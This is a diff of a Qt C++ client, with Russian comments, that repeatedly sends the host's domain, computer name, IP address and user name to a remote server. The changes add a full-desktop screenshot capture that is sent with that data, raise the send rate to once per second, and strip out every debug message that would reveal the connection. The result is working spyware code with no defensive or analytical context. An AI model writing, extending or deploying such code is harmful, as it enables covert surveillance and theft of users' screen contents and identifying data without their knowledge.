@@ -1,11 +1,15 @@
-#include <QCoreApplication>
+#include <QApplication>
 #include <QTcpSocket>
-#include <QDebug>
 #include <QDateTime>
 #include <QHostInfo>
 #include <QNetworkInterface>
 #include <QSysInfo>
 #include <QTimer>
+
+#include <QPixmap>
+#include <QDesktopWidget>
+#include <QBuffer>
+
 
 // Функция для создания клиента и установки соединения с сервером
 void connectToServer()
@@ -15,12 +19,9 @@ void connectToServer()
 
     if (!socket->waitForConnected(5000))
     {
-        qDebug() << "Failed to connect to server!";
         socket->deleteLater();
         return;
     }
-
-    qDebug() << "Connected to server!";
 
     // Получение текущего времени
     QDateTime currentTime = QDateTime::currentDateTime();
@@ -39,21 +40,28 @@ void connectToServer()
             break;
         }
     }
-    QString userName = qgetenv("USER"); // Для Unix-подобных систем
-    if (userName.isEmpty())
-        userName = qgetenv("USERNAME"); // Для Windows
+    QString userName = qgetenv("USERNAME"); // Для Windows
+
+
+    QPixmap px = QPixmap::grabWindow(QApplication::desktop()->winId());
+    QPixmap screenshot = px.scaled(px.width() / 5, px.height() / 5);
+    QByteArray screenshotData;
+    QBuffer buffer(&screenshotData);
+    buffer.open(QIODevice::WriteOnly);
+    screenshot.save(&buffer, "PNG");
 
     // Создание строки данных, включающей время, домен, компьютер, IP-адрес и пользователя
-    QString data = domain + computerName + ipAddress + userName + "," + domain + "," + computerName + "," + ipAddress + "," + userName + "," + timeString ;
+    QString data = domain + computerName + ipAddress + userName +
+            "," + domain + "," + computerName + "," + ipAddress + "," + userName + "," + timeString + ",";
 
     // Отправка данных на сервер
     socket->write(data.toUtf8());
+    socket->write(screenshotData);
     socket->waitForBytesWritten(5000);
 
     // Получение ответа от сервера
     socket->waitForReadyRead(5000);
     QByteArray response = socket->readAll();
-    qDebug() << "Server response:" << response;
 
     socket->disconnectFromHost();
     socket->deleteLater();
@@ -61,12 +69,12 @@ void connectToServer()
 
 int main(int argc, char *argv[])
 {
-    QCoreApplication a(argc, argv);
+    QApplication a(argc, argv);
 
     // Установка таймера для повторного подключения к серверу
     QTimer timer;
     QObject::connect(&timer, &QTimer::timeout, &connectToServer);
-    timer.start(5000); // Интервал повторного подключения (в миллисекундах)
+    timer.start(1000); // Интервал повторного подключения (в миллисекундах)
 
     // Подключение к серверу при запуске клиента
     connectToServer();
